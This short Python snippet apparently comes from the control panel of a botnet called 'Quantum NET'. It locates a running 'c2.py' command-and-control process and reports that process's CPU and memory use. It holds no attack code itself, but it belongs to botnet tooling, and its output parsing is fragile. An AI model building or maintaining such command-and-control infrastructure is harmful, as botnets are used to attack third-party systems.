import os, sys, time, subprocess

class Usage:
    def Usage():
        cnc_pid = subprocess.getoutput("pgrep -f c2.py").split("\n")[0]
        get_usage = subprocess.getoutput(f"ps -p {cnc_pid} -o %cpu,%mem,cmd").split(" ")
        return f"Quantum NET Usage\r\nCPU: {get_usage[3]} | MEM: {get_usage[5]}\r\n"